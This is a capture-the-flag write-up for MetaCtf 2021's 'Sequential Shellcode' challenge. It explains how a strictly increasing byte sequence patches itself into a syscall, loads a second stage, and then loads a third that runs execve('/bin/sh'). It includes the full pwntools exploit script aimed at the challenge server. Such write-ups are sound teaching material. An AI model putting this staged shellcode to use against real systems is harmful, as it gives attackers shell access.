## Sequential Shellcode

was a shellcoding pwn challenge from MetaCtf 2021.

A very interesting one, got first blood on it, and there was only one solve..

So the concept was to write a shellcode where every byte must be bigger then the preceding one..

a increasing only shellcode..more or less...

The shellcode is copied to a memory zone RWX mapper at address 0x0000133713370000

first we use the fact that in the register rcx, you will get the length of shellcode less 1.

so we send a shellcode of length 0x10 to have 0x0f in rcx..

that will be usefull for us...

let's see registers state when we enter the shellcode:

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/MetaCtf.2021/pwn/Sequential.Shellcode/pics/registers.png)

you can see that we set rcx to 0x0f above.

first we will use:

`04 05       add al,5`

like this we can change it to a syscall with the next instruction, that will modify the 04 opcode to 0F

`  or byte ptr[rdx],cl`

now we have a syscall at the address 0x0000133713370000 where our shellcode start.

then we clear al, to make rax pointing again to shellcode start.

then we set the registers correctly to call read..

and we jump back to the beginning of the shellcode, and we will read a second shellcode non restricted above the first one..

this second shellcode will read a third one , that will do execve("/bin/sh", 0,0)

and that's all

so here is my solution:

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/MetaCtf.2021/pwn/Sequential.Shellcode/pics/bytes.png)


```asm
begin:
  add al,5
  or byte ptr[rdx],cl
  and al,0x28
  push rax
  push rcx
  push rbx
  pop rax
  pop rdx
  pop rsi
  jno begin
  .byte 0xf5,0xf6
```

and the full exploit:

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF('./sequential')

host, port = "host.cg21.metaproblems.com", "3340"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

shellc = asm('''
begin:
  add al,5
  or byte ptr[rdx],cl
  and al,0x28
  push rax
  push rcx
  push rbx
  pop rax
  pop rdx
  pop rsi
  jno begin
  .byte 0xf5,0xf6

''')

print(hexdump(shellc))

payload = shellc
p.sendlineafter('bytes?\n', str(len(payload)))


for i in payload:
  p.sendlineafter('> ', str(ord(i)))

shellc2 = asm('''
  .byte 0xf,0x05
  xor eax,eax
  push 0x40
  pop rdx
  syscall
''')

p.send(shellc2.ljust(15,'\x90'))

shellc3 = asm('''
  .byte 0x90,0x90,0x90,0x90,0x90,0x90, 0x90,0x90,0x90
  xor esi, esi
  push rsi
  mov rbx, 0x68732f2f6e69622f
  push rbx
  push rsp
  pop rdi
  imul esi
  mov al, 0x3b
  syscall
''')

p.send(shellc3)

p.interactive()
```

*nobodyisnobody still pwning things*
